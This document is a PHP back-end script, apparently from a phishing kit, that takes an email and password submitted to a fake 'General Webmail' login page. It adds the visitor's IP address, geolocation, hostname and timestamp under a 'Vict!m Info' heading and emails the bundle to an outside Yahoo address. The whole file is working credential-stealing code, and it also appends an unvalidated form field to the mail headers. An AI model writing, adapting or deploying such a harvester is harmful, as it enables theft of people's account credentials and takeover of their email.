<?php
$data = json_decode( file_get_contents('php://input') );
var_dump( $data->operation );
  
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email:             : ".$_POST['email']."\n"; 
$message .= "Password:             : ".$_POST['password']."\n"; 
$mind = $_POST['user'];
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Martins-------------\n";
$send = "staraiser@yahoo.com";
$subject = "General Webmail From $ip";
$headers = "From: General Webmail <wewee@pisspooor.com>";
$headers .= $_POST['jdgioool']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

?> 
